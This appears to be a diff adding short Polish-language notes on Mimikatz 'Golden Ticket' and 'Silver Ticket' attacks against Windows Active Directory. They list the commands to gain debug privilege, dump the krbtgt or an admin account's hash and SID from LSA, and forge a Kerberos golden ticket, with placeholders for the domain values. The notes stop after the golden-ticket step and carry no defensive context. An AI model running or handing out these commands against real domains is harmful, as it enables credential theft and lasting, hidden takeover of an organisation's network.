@@ -1,0 +1,13 @@
+1) Mimikatz (Zloty bilet)  (Srebrny bilet)
+      • Uprawnienia
+            ▪ privilege::debug
+      • Zrzucenie skrutow oraz identyfikatorow bezpieczenstwa
+            ▪ Zloty bilet
+               - lsadump::lsa /inject /name:krbtgt
+            ▪ Srebrny bilet
+               - lsadump::lsa /inject /name:<user admin>
+      • Utworzenie biletu
+            ▪ Zloty bilet
+               - Kerberos::golden /user:<user> /domain:<domena>/sid:<> /krbtgt:<NTLM> /id:<id user (rid)>
+            
+            
